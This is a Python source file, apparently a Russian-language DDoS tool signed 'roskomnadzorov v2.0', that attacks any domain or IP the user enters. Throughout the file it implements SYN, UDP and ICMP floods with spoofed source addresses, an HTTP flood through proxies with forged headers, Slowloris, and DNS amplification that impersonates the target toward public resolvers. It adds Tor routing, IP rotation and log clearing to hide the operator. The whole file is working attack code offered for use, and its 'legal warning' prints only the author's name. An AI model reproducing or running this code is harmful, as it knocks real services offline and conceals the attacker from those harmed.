"""
by roskomnadzorov
v2.0
"""

import socket
import threading
import random
import time
import ssl
import struct
import array
import ipaddress
import hashlib
import os
import sys
import json
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# Безопасный импорт с проверками
try:
    from scapy.all import *
    from scapy.layers.dns import DNS, DNSQR
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    from scapy.sendrecv import send
except ImportError:
    print("Установите scapy: pip install scapy")
    sys.exit(1)

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("Установите requests: pip install requests")
    sys.exit(1)

try:
    import dns.resolver
except ImportError:
    print("Установите dnspython: pip install dnspython")
    sys.exit(1)

try:
    import socks
    from stem import Signal
    from stem.control import Controller
    SOCKS5_AVAILABLE = True
except ImportError:
    SOCKS5_AVAILABLE = False
    print("Для TOR/SOCKS5 установите: pip install PySocks stem")

try:
    from fake_useragent import UserAgent
    UA_AVAILABLE = True
except ImportError:
    UA_AVAILABLE = False
    print("Для случайных User-Agent: pip install fake-useragent")

# Глобальная конфигурация
CONFIG = {
    'max_threads': 100,  # Уменьшено для стабильности
    'attack_duration': 300,  # 5 минут для теста
    'use_tor': False,
    'use_socks5': False,
    'enable_ip_spoofing': True,
    'enable_dns_spoofing': True,
    'randomize_timings': True,
    'max_connections_per_ip': 10,
    'packet_delay_range': (0.001, 0.1),  # секунды
}

class AnonymousDDoSTester:
    def __init__(self, target):
        self.target_domain = target.strip()
        self.session_id = hashlib.sha256(f"{datetime.now()}{random.random()}".encode()).hexdigest()[:16]
        
        print(f"\n{'='*60}")
        print(f"СЕССИЯ: {self.session_id}")
        print(f"ВРЕМЯ: {datetime.now()}")
        print(f"{'='*60}")
        
        # Проверка прав доступа (нужны root для raw socket)
        if os.geteuid() != 0 and CONFIG['enable_ip_spoofing']:
            print("ВНИМАНИЕ: Запуск без root прав, спуфинг IP будет ограничен")
            CONFIG['enable_ip_spoofing'] = False
        
        # Инициализация прокси
        self.proxy_list = []
        self.current_proxy = None
        self.load_proxies()
        
        # Инициализация User-Agent
        self.user_agents = self.init_user_agents()
        
        # Разрешение цели
        self.target_ip = self.resolve_target_anonymously()
        self.target_ips = self.get_dns_records_anonymously()
        
        # Списки портов (расширенные)
        self.tcp_ports = self.generate_port_list('tcp')
        self.udp_ports = self.generate_port_list('udp')
        
        # Счетчики
        self.counters = {
            'syn': 0, 'http': 0, 'udp': 0, 
            'dns': 0, 'icmp': 0, 'slowloris': 0
        }
        
        # Время окончания атаки
        self.end_time = time.time() + CONFIG['attack_duration']
        
        # Логирование (только в память)
        self.log = []
        
        self.print_banner()
    
    def print_banner(self):
        """Вывод информации о сессии"""
        print(f"\nЦЕЛЬ: {self.target_domain}")
        print(f"IP адресов: {len(self.target_ips)}")
        if self.target_ips:
            print(f"Основной: {self.target_ips[0]}")
        print(f"️Длительность: {CONFIG['attack_duration']} сек")
        print(f"Макс потоков: {CONFIG['max_threads']}")
        print(f"Спуфинг IP: {'ВКЛ' if CONFIG['enable_ip_spoofing'] else 'ВЫКЛ'}")
        print(f"Прокси: {len(self.proxy_list)} доступно")
        print(f"User-Agents: {len(self.user_agents)}")
        print(f"{'='*60}\n")
    
    def load_proxies(self):
        """Загрузка прокси из различных источников"""
        # 1. Из файла proxies.txt
        try:
            with open('proxies.txt', 'r') as f:
                self.proxy_list = [line.strip() for line in f if line.strip()]
        except:
            pass
        
        # 2. Публичные прокси (осторожно, могут быть ловушками)
        public_proxies = [
            '185.199.229.156:7492',
            '185.199.228.220:7300',
            '188.74.183.10:8279',
        ]
        
        if not self.proxy_list:
            self.proxy_list = public_proxies
        
        # Инициализация TOR если доступен
        if SOCKS5_AVAILABLE and CONFIG['use_tor']:
            self.init_tor_proxy()
    
    def init_tor_proxy(self):
        """Инициализация TOR прокси"""
        try:
            # SOCKS5 прокси TOR
            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            socket.socket = socks.socksocket
            
            # Проверка работы TOR
            test_socket = socks.socksocket()
            test_socket.settimeout(5)
            test_socket.connect(("check.torproject.org", 80))
            test_socket.send(b"GET / HTTP/1.0\r\n\r\n")
            response = test_socket.recv(1024)
            
            if b"Congratulations" in response:
                print("TOR подключен успешно")
                return True
        except Exception as e:
            print(f"❌ Ошибка TOR: {e}")
        
        return False
    
    def get_tor_session(self):
        """Создание requests сессии с TOR"""
        session = requests.Session()
        
        if SOCKS5_AVAILABLE and CONFIG['use_tor']:
            session.proxies = {
                'http': 'socks5h://127.0.0.1:9050',
                'https': 'socks5h://127.0.0.1:9050'
            }
        
        return session
    
    def rotate_tor_ip(self):
        """Смена IP адреса в TOR"""
        if not SOCKS5_AVAILABLE or not CONFIG['use_tor']:
            return False
        
        try:
            with Controller.from_port(port=9051) as controller:
                controller.authenticate()
                controller.signal(Signal.NEWNYM)
                time.sleep(5)  # Ждем смены цепи
                return True
        except:
            return False
    
    def init_user_agents(self):
        """Инициализация списка User-Agent"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "curl/7.88.1",
            "python-requests/2.31.0",
        ]
        
        if UA_AVAILABLE:
            try:
                ua = UserAgent()
                # Добавляем несколько случайных
                for _ in range(10):
                    user_agents.append(ua.random)
            except:
                pass
        
        return user_agents
    
    def resolve_target_anonymously(self):
        """Анонимное разрешение домена в IP"""
        # Пробуем через публичные DNS серверы
        dns_servers = [
            ('8.8.8.8', 53),  # Google DNS
            ('1.1.1.1', 53),  # Cloudflare DNS
            ('9.9.9.9', 53),  # Quad9
        ]
        
        # Проверяем, может это уже IP
        try:
            socket.inet_aton(self.target_domain)
            return self.target_domain
        except socket.error:
            pass
        
        # Пробуем разрешить через разные DNS
        for dns_server, port in dns_servers:
            try:
                query = DNSQR(qname=self.target_domain)
                dns_packet = IP(dst=dns_server)/UDP(dport=port)/DNS(rd=1, qd=query)
                response = sr1(dns_packet, timeout=2, verbose=0)
                
                if response and response.haslayer(DNS):
                    for i in range(response.ancount):
                        if response.an[i].type == 1:  # A record
                            return response.an[i].rdata
            except:
                continue
        
        # Если не получилось через DNS, пробуем стандартный метод
        try:
            return socket.gethostbyname(self.target_domain)
        except:
            print(f"❌ Не удалось разрешить домен: {self.target_domain}")
            sys.exit(1)
    
    def get_dns_records_anonymously(self):
        """Анонимное получение DNS записей"""
        ips = set([self.target_ip])
        
        # Используем несколько DNS серверов
        dns_servers = ['8.8.8.8', '1.1.1.1', '9.9.9.9']
        
        for server in dns_servers:
            try:
                resolver = dns.resolver.Resolver()
                resolver.nameservers = [server]
                
                # Запрос A записей
                answers = resolver.resolve(self.target_domain, 'A')
                for rdata in answers:
                    ips.add(str(rdata))
                
                # Дополнительные типы записей
                try:
                    mx_answers = resolver.resolve(self.target_domain, 'MX')
                    for mx in mx_answers:
                        try:
                            mx_ips = resolver.resolve(str(mx.exchange), 'A')
                            for ip in mx_ips:
                                ips.add(str(ip))
                        except:
                            pass
                except:
                    pass
                    
            except Exception as e:
                continue
        
        return list(ips)
    
    def generate_port_list(self, protocol='tcp'):
        """Генерация списка портов для атаки"""
        if protocol == 'tcp':
            return list(set([
                80, 443, 8080, 8443,  # HTTP/S
                22, 21, 23, 25, 110, 143,  # SSH, FTP, SMTP, POP3, IMAP
                3306, 5432, 27017,  # MySQL, PostgreSQL, MongoDB
                3389, 5900,  # RDP, VNC
                25565,  # Minecraft
            ]))
        else:  # udp
            return list(set([
                53, 123, 161, 1900,  # DNS, NTP, SNMP, SSDP
                27015, 27016,  # Steam
                5060,  # SIP
                6881, 6889,  # BitTorrent
            ]))
    
    def generate_spoofed_ip(self):
        """Генерация случайного IP для спуфинга"""
        if not CONFIG['enable_ip_spoofing']:
            # Если спуфинг отключен, генерируем "серые" IP
            return f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        
        # Используем реальные диапазоны IP
        networks = [
            '1.0.0.0/8', '2.0.0.0/8', '5.0.0.0/8',
            '31.0.0.0/8', '37.0.0.0/8', '46.0.0.0/8',
            '77.0.0.0/8', '78.0.0.0/8', '79.0.0.0/8',
            '93.0.0.0/8', '94.0.0.0/8', '95.0.0.0/8',
        ]
        
        network = random.choice(networks)
        
        try:
            net = ipaddress.ip_network(network)
            hosts = list(net.hosts())
            if hosts:
                return str(random.choice(hosts))
        except:
            pass
        
        # Fallback
        octets = []
        octets.append(random.randint(1, 223))  # Class A, B, C
        for _ in range(3):
            octets.append(random.randint(0, 255))
        
        # Избегаем специальных адресов
        if octets[0] == 10:  # Private A
            octets[0] = random.choice([1, 2, 5, 31])
        elif octets[0] == 172 and 16 <= octets[1] <= 31:  # Private B
            octets[0] = random.choice([93, 94, 95])
        elif octets[0] == 192 and octets[1] == 168:  # Private C
            octets[0] = random.choice([77, 78, 79])
        
        return ".".join(map(str, octets))
    
    def get_random_proxy(self):
        """Получение случайного прокси"""
        if not self.proxy_list:
            return None
        
        proxy = random.choice(self.proxy_list)
        
        # Проверка прокси
        try:
            ip, port = proxy.split(':')
            test_socket = socket.socket()
            test_socket.settimeout(2)
            test_socket.connect((ip, int(port)))
            test_socket.close()
            return proxy
        except:
            # Удаляем нерабочий прокси
            if proxy in self.proxy_list:
                self.proxy_list.remove(proxy)
            return self.get_random_proxy() if self.proxy_list else None
    
    def delay(self):
        """Случайная задержка для имитации человеческого поведения"""
        if CONFIG['randomize_timings']:
            delay_time = random.uniform(*CONFIG['packet_delay_range'])
            time.sleep(delay_time)
    
    # === МЕТОДЫ АТАК ===
    
    def syn_flood_attack(self):
        """SYN flood с улучшенным спуфингом"""
        print("[SYN] Запуск SYN flood...")
        
        def syn_worker(worker_id):
            local_count = 0
            
            while time.time() < self.end_time and local_count < 10000:  # Лимит на worker
                for target_ip in self.target_ips:
                    for port in random.sample(self.tcp_ports, min(3, len(self.tcp_ports))):
                        try:
                            # Генерация спуфингованного IP
                            src_ip = self.generate_spoofed_ip()
                            
                            # Создание пакета
                            ip_layer = IP(
                                src=src_ip,
                                dst=target_ip,
                                id=random.randint(1, 65535),
                                ttl=random.randint(30, 255)
                            )
                            
                            tcp_layer = TCP(
                                sport=random.randint(1024, 65535),
                                dport=port,
                                flags="S",  # SYN
                                seq=random.randint(0, 2**32-1),
                                window=random.randint(1024, 65535)
                            )
                            
                            # Отправка пакета
                            send(ip_layer / tcp_layer, verbose=0)
                            local_count += 1
                            
                            # Обновление счетчика
                            if local_count % 100 == 0:
                                with threading.Lock():
                                    self.counters['syn'] += 100
                            
                            # Случайная задержка
                            self.delay()
                            
                        except Exception as e:
                            continue
            
            # Финальное обновление счетчика
            with threading.Lock():
                self.counters['syn'] += local_count % 100
        
        # Запуск worker'ов
        workers = min(50, CONFIG['max_threads'] // 4)
        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(syn_worker, i) for i in range(workers)]
            for future in as_completed(futures):
                try:
                    future.result(timeout=CONFIG['attack_duration'] + 10)
                except:
                    pass
        
        print(f"[SYN] Завершено. Отправлено: {self.counters['syn']:,}")
    
    def http_flood_attack(self):
        """HTTP flood с использованием прокси"""
        print("[HTTP] Запуск HTTP flood...")
        
        # Разные пути для запросов
        paths = [
            '/', '/index.html', '/index.php', '/wp-admin/',
            '/api/v1/test', '/login', '/register',
            '/robots.txt', '/sitemap.xml', '/admin'
        ]
        
        def http_worker(worker_id):
            local_count = 0
            
            # Создание сессии
            session = requests.Session()
            
            # Настройка прокси если есть
            proxy = self.get_random_proxy()
            if proxy:
                session.proxies = {
                    'http': f'http://{proxy}',
                    'https': f'http://{proxy}'
                }
            
            # Настройка таймаутов
            session.timeout = 3
            
            while time.time() < self.end_time and local_count < 5000:
                for target_ip in self.target_ips:
                    try:
                        # Выбор случайных параметров
                        path = random.choice(paths)
                        method = random.choice(['GET', 'POST', 'HEAD'])
                        user_agent = random.choice(self.user_agents)
                        
                        # Формирование URL
                        url = f"http://{target_ip}:80{path}"
                        
                        # Заголовки
                        headers = {
                            'User-Agent': user_agent,
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Accept-Language': 'en-US,en;q=0.5',
                            'Accept-Encoding': 'gzip, deflate',
                            'Connection': 'keep-alive',
                            'Cache-Control': 'max-age=0',
                            'X-Forwarded-For': self.generate_spoofed_ip(),
                            'X-Real-IP': self.generate_spoofed_ip(),
                        }
                        
                        # Отправка запроса
                        try:
                            if method == 'GET':
                                response = session.get(url, headers=headers, timeout=2)
                            elif method == 'POST':
                                response = session.post(url, headers=headers, 
                                                      data={'data': 'x' * random.randint(100, 1000)}, 
                                                      timeout=2)
                            else:  # HEAD
                                response = session.head(url, headers=headers, timeout=2)
                            
                            local_count += 1
                            
                            # Обновление счетчика
                            if local_count % 50 == 0:
                                with threading.Lock():
                                    self.counters['http'] += 50
                            
                        except requests.exceptions.RequestException:
                            # Если не работает через requests, пробуем raw socket
                            try:
                                self.raw_http_request(target_ip, path, headers)
                                local_count += 1
                                with threading.Lock():
                                    self.counters['http'] += 1
                            except:
                                continue
                        
                        # Случайная задержка
                        self.delay()
                        
                    except:
                        continue
            
            # Финальное обновление
            with threading.Lock():
                self.counters['http'] += local_count % 50
        
        # Запуск worker'ов
        workers = min(30, CONFIG['max_threads'] // 3)
        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(http_worker, i) for i in range(workers)]
            for future in as_completed(futures):
                try:
                    future.result(timeout=CONFIG['attack_duration'] + 10)
                except:
                    pass
        
        print(f"[HTTP] Завершено. Отправлено: {self.counters['http']:,}")
    
    def raw_http_request(self, ip, path, headers):
        """Raw HTTP запрос через socket"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((ip, 80))
            
            # Формирование запроса
            request = f"GET {path} HTTP/1.1\r\n"
            request += f"Host: {ip}\r\n"
            for key, value in headers.items():
                request += f"{key}: {value}\r\n"
            request += "\r\n"
            
            s.send(request.encode())
            s.close()
            return True
        except:
            return False
    
    def udp_flood_attack(self):
        """UDP flood с переменным размером пакетов"""
        print("[UDP] Запуск UDP flood...")
        
        def udp_worker(worker_id):
            local_count = 0
            
            while time.time() < self.end_time and local_count < 20000:
                for target_ip in self.target_ips:
                    for port in random.sample(self.udp_ports, min(3, len(self.udp_ports))):
                        try:
                            # Случайный размер данных
                            data_size = random.choice([64, 128, 256, 512, 1024])
                            data = os.urandom(data_size)
                            
                            # Отправка через raw socket со спуфингом
                            if CONFIG['enable_ip_spoofing']:
                                src_ip = self.generate_spoofed_ip()
                                ip_layer = IP(src=src_ip, dst=target_ip)
                                udp_layer = UDP(sport=random.randint(1024, 65535), dport=port)
                                packet = ip_layer / udp_layer / data
                                send(packet, verbose=0)
                            
                            # Дублирующая отправка через обычный socket
                            try:
                                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                sock.settimeout(0.1)
                                sock.sendto(data, (target_ip, port))
                                sock.close()
                            except:
                                pass
                            
                            local_count += 1
                            
                            # Обновление счетчика
                            if local_count % 500 == 0:
                                with threading.Lock():
                                    self.counters['udp'] += 500
                            
                            # Минимальная задержка для UDP flood
                            if CONFIG['randomize_timings']:
                                time.sleep(random.uniform(0.001, 0.01))
                            
                        except:
                            continue
            
            # Финальное обновление
            with threading.Lock():
                self.counters['udp'] += local_count % 500
        
        # Запуск worker'ов
        workers = min(40, CONFIG['max_threads'] // 2)
        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(udp_worker, i) for i in range(workers)]
            for future in as_completed(futures):
                try:
                    future.result(timeout=CONFIG['attack_duration'] + 10)
                except:
                    pass
        
        print(f"[UDP] Завершено. Отправлено: {self.counters['udp']:,}")
    
    def slowloris_attack(self):
        """Slowloris атака с управляемым количеством соединений"""
        print("[SLOWLORIS] Запуск Slowloris...")
        
        connections = []
        max_connections = 500  # Ограничение для избежания перегрузки
        
        def create_connection(conn_id):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((random.choice(self.target_ips), 80))
                
                # Отправка неполного запроса
                request = f"GET /?{conn_id} HTTP/1.1\r\n"
                request += f"Host: {random.choice(self.target_ips)}\r\n"
                request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
                request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                request += "Accept-Language: en-US,en;q=0.5\r\n"
                request += "Accept-Encoding: gzip, deflate\r\n"
                request += "Connection: keep-alive\r\n"
                request += f"X-Forwarded-For: {self.generate_spoofed_ip()}\r\n"
                
                s.send(request.encode())
                return s
            except:
                return None
        
        # Создание начальных соединений
        print("[SLOWLORIS] Создание соединений...")
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(create_connection, i) for i in range(max_connections)]
            for future in as_completed(futures):
                conn = future.result()
                if conn:
                    connections.append(conn)
        
        active_connections = len(connections)
        self.counters['slowloris'] = active_connections
        
        print(f"[SLOWLORIS] Активных соединений: {active_connections}")
        
        # Поддержание соединений
        start_time = time.time()
        while time.time() < self.end_time and connections:
            # Поддерживаем существующие соединения
            for conn in connections[:]:
                try:
                    # Периодически отправляем заголовки
                    if random.random() < 0.1:  # 10% chance
                        conn.send(f"X-{random.randint(1000,9999)}: {random.randint(1000,9999)}\r\n".encode())
                except:
                    connections.remove(conn)
            
            # Восстановление потерянных соединений
            if time.time() - start_time > 10 and len(connections) < max_connections * 0.8:
                needed = max_connections - len(connections)
                with ThreadPoolExecutor(max_workers=10) as executor:
                    futures = [executor.submit(create_connection, i) for i in range(needed)]
                    for future in as_completed(futures):
                        conn = future.result()
                        if conn:
                            connections.append(conn)
                
                active_connections = len(connections)
                self.counters['slowloris'] = active_connections
                start_time = time.time()
            
            time.sleep(random.uniform(5, 15))
        
        # Закрытие всех соединений
        for conn in connections:
            try:
                conn.close()
            except:
                pass
        
        print(f"[SLOWLORIS] Завершено. Макс соединений: {self.counters['slowloris']}")
    
    def dns_amplification_attack(self):
        """DNS amplification атака"""
        print("[DNS] Запуск DNS amplification...")
        
        # Список уязвимых DNS серверов (публичные)
        dns_servers = [
            '8.8.8.8', '8.8.4.4',  # Google DNS
            '1.1.1.1', '1.0.0.1',  # Cloudflare
            '9.9.9.9', '149.112.112.112',  # Quad9
        ]
        
        # Домены для больших ответов
        large_domains = [
            'isc.org', 'ripe.net', 'arin.net',
            'google.com', 'microsoft.com', 'apple.com'
        ]
        
        def dns_worker(worker_id):
            local_count = 0
            
            while time.time() < self.end_time and local_count < 5000:
                try:
                    # Выбор случайных параметров
                    dns_server = random.choice(dns_servers)
                    domain = random.choice(large_domains)
                    
                    # Создание DNS запроса
                    if CONFIG['enable_ip_spoofing']:
                        # Спуфинг источника - отправляем от имени цели к DNS серверу
                        src_ip = random.choice(self.target_ips)
                        ip_layer = IP(src=src_ip, dst=dns_server)
                        udp_layer = UDP(sport=53, dport=53)
                        dns_query = DNS(rd=1, qd=DNSQR(qname=domain, qtype='ANY'))
                        
                        packet = ip_layer / udp_layer / dns_query
                        send(packet, verbose=0)
                        local_count += 1
                    
                    # Обновление счетчика
                    if local_count % 100 == 0:
                        with threading.Lock():
                            self.counters['dns'] += 100
                    
                    # Задержка
                    self.delay()
                    
                except:
                    continue
            
            # Финальное обновление
            with threading.Lock():
                self.counters['dns'] += local_count % 100
        
        # Запуск worker'ов
        workers = min(20, CONFIG['max_threads'] // 5)
        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(dns_worker, i) for i in range(workers)]
            for future in as_completed(futures):
                try:
                    future.result(timeout=CONFIG['attack_duration'] + 10)
                except:
                    pass
        
        print(f"[DNS] Завершено. Отправлено: {self.counters['dns']:,}")
    
    def icmp_flood_attack(self):
        """ICMP flood (Ping flood)"""
        print("[ICMP] Запуск ICMP flood...")
        
        def icmp_worker(worker_id):
            local_count = 0
            
            while time.time() < self.end_time and local_count < 10000:
                for target_ip in self.target_ips:
                    try:
                        if CONFIG['enable_ip_spoofing']:
                            src_ip = self.generate_spoofed_ip()
                            
                            # Разные типы ICMP
                            icmp_type = random.choice([8, 13, 17])  # Echo, Timestamp, Address Mask
                            
                            ip_layer = IP(
                                src=src_ip,
                                dst=target_ip,
                                ttl=random.randint(30, 255)
                            )
                            
                            # Случайные данные
                            data_size = random.choice([64, 128, 256, 512])
                            data = os.urandom(data_size)
                            
                            icmp_layer = ICMP(type=icmp_type, id=random.randint(1, 65535))
                            packet = ip_layer / icmp_layer / data
                            
                            send(packet, verbose=0)
                            local_count += 1
                            
                            # Обновление счетчика
                            if local_count % 200 == 0:
                                with threading.Lock():
                                    self.counters['icmp'] += 200
                            
                            # Задержка
                            if CONFIG['randomize_timings']:
                                time.sleep(random.uniform(0.001, 0.02))
                            
                    except:
                        continue
            
            # Финальное обновление
            with threading.Lock():
                self.counters['icmp'] += local_count % 200
        
        # Запуск worker'ов
        workers = min(30, CONFIG['max_threads'] // 3)
        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(icmp_worker, i) for i in range(workers)]
            for future in as_completed(futures):
                try:
                    future.result(timeout=CONFIG['attack_duration'] + 10)
                except:
                    pass
        
        print(f"[ICMP] Завершено. Отправлено: {self.counters['icmp']:,}")
    
    def cleanup(self):
        """Очистка ресурсов и следов"""
        print("\nОчистка ресурсов...")
        
        # Закрытие всех сокетов
        try:
            socket.socket = socket._socketobject  # Восстановление оригинального socket
        except:
            pass
        
        # Очистка логов
        self.log.clear()
        
        # Задержка для завершения операций
        time.sleep(2)
        
        print("Очистка завершена")
    
    def run_attack(self, attack_type='all'):
        """Запуск выбранной атаки"""
        print(f"\nЗАПУСК АТАКИ: {attack_type.upper()}")
        print(f"Начало: {datetime.now()}")
        print(f"️Ожидаемое время: {CONFIG['attack_duration']} секунд")
        print(f"{'='*60}")
        
        # Обратный отсчет
        for i in range(3, 0, -1):
            print(f"Старт через {i}...")
            time.sleep(1)
        
        attack_methods = {
            'syn': self.syn_flood_attack,
            'http': self.http_flood_attack,
            'udp': self.udp_flood_attack,
            'dns': self.dns_amplification_attack,
            'slowloris': self.slowloris_attack,
            'icmp': self.icmp_flood_attack,
        }
        
        if attack_type == 'all':
            # Запуск всех атак в отдельных потоках
            threads = []
            for name, method in attack_methods.items():
                thread = threading.Thread(target=method, name=f"Attack-{name}")
                thread.daemon = True
                threads.append(thread)
                thread.start()
                time.sleep(0.5)  # Небольшая задержка между запуском
            
            # Мониторинг прогресса
            self.monitor_progress(threads)
            
        elif attack_type in attack_methods:
            # Запуск конкретной атаки
            attack_methods[attack_type]()
        else:
            print(f"Неизвестный тип атаки: {attack_type}")
            return
        
        # Отображение результатов
        self.show_results()
        
        # Очистка
        self.cleanup()
    
    def monitor_progress(self, threads):
        """Мониторинг прогресса атаки"""
        start_time = time.time()
        
        while time.time() < self.end_time and any(t.is_alive() for t in threads):
            elapsed = time.time() - start_time
            remaining = max(0, self.end_time - time.time())
            
            # Обновление статистики
            total = sum(self.counters.values())
            
            print(f"\r Прогресс: {elapsed:.1f}s / {CONFIG['attack_duration']}s | "
                  f"SYN: {self.counters['syn']:,} | "
                  f"HTTP: {self.counters['http']:,} | "
                  f"UDP: {self.counters['udp']:,} | "
                  f"Всего: {total:,}", end="", flush=True)
            
            time.sleep(1)
        
        # Ожидание завершения потоков
        for thread in threads:
            thread.join(timeout=5)
        
        print()  # Новая строка после прогресс-бара
    
    def show_results(self):
        """Отображение результатов атаки"""
        print(f"\n{'='*60}")
        print("📊 РЕЗУЛЬТАТЫ ТЕСТА")
        print(f"{'='*60}")
        
        total = sum(self.counters.values())
        
        if total == 0:
            print("Атака не удалась - возможно, цель защищена или недоступна")
            return
        
        print(f"Цель: {self.target_domain}")
        print(f"Время: {datetime.now()}")
        print(f"Длительность: {CONFIG['attack_duration']} секунд")
        print(f"{'-'*40}")
        print(f" Всего отправлено: {total:,} пакетов/запросов")
        print(f"SYN пакетов: {self.counters['syn']:,}")
        print(f"HTTP запросов: {self.counters['http']:,}")
        print(f"UDP пакетов: {self.counters['udp']:,}")
        print(f"DNS запросов: {self.counters['dns']:,}")
        print(f"Slowloris соединений: {self.counters['slowloris']:,}")
        print(f"ICMP пакетов: {self.counters['icmp']:,}")
        print(f"{'='*60}")
        
        # Оценка результата
        if total > 100000:
            print("ВЫСОКАЯ ЭФФЕКТИВНОСТЬ: Сервер, вероятно, недоступен")
        elif total > 50000:
            print("️СРЕДНЯЯ ЭФФЕКТИВНОСТЬ: Сервер испытывает нагрузки")
        elif total > 10000:
            print("НИЗКАЯ ЭФФЕКТИВНОСТЬ: Незначительное воздействие")
        else:
            print("МИНИМАЛЬНОЕ ВОЗДЕЙСТВИЕ: Сервер хорошо защищен")

# === ОСНОВНАЯ ЧАСТЬ ===

def print_legal_warning():
    """Вывод автора"""
    print("""
by roskomnadzorov
v2.0
    """)

def get_user_confirmation():
    """Получение подтверждения от пользователя"""
    print("\n" + "="*60)
    target = input(" Введите домен или IP для тестирования: ").strip()
    
    if not target:
        print("Цель не указана")
        return None
    
    print(f"\nВы выбрали цель: {target}")
    print("\nДоступные типы атак:")
    print("1. all - Все атаки одновременно (наиболее эффективно)")
    print("2. syn - Только SYN flood")
    print("3. http - Только HTTP flood")
    print("4. udp - Только UDP flood")
    print("5. dns - Только DNS amplification")
    print("6. slowloris - Только Slowloris")
    print("7. icmp - Только ICMP flood")
    
    attack_type = input("\nВыберите тип атаки (по умолчанию all): ").strip().lower()
    if not attack_type or attack_type not in ['all', 'syn', 'http', 'udp', 'dns', 'slowloris', 'icmp']:
        attack_type = 'all'
    
    duration = input("Длительность атаки в секундах (по умолчанию 300): ").strip()
    if duration.isdigit():
        CONFIG['attack_duration'] = min(int(duration), 1800)  # Макс 30 минут
    
    # Финальное подтверждение
    print(f"\n{'='*60}")
    print(f"ЦЕЛЬ: {target}")
    print(f"ТИП: {attack_type}")
    print(f"️ВРЕМЯ: {CONFIG['attack_duration']} секунд")
    print(f"{'='*60}")
    
    confirm = input("\nВы уверены, что правильно указали цель? (yes/NO): ").strip().lower()
    
    if confirm == 'yes':
        return target, attack_type
    else:
        print("Отменено пользователем")
        return None

def main():
    """Основная функция"""
    # Очистка экрана
    os.system('clear' if os.name == 'posix' else 'cls')
    
    # Вывод предупреждения
    print_legal_warning()
    
    # Получение подтверждения
    user_input = get_user_confirmation()
    if not user_input:
        return
    
    target, attack_type = user_input
    
    try:
        # Создание и запуск тестера
        tester = AnonymousDDoSTester(target)
        tester.run_attack(attack_type)
        
    except KeyboardInterrupt:
        print("\n\n️  Атака остановлена пользователем")
    except Exception as e:
        print(f"\n❌ Критическая ошибка: {e}")
        import traceback
        traceback.print_exc()
    finally:
        print("\n" + "="*60)
        print(" Работа программы завершена")
        print("="*60)

if __name__ == "__main__":
    # Проверка версии Python
    if sys.version_info < (3, 7):
        print("❌ Требуется Python 3.7 или выше")
        sys.exit(1)
    
    # Проверка прав (предупреждение, а не требование)
    if os.name == 'posix' and os.geteuid() != 0:
        print("Рекомендуется запуск с правами root для спуфинга IP")
    
    # Запуск основной программы
    main()
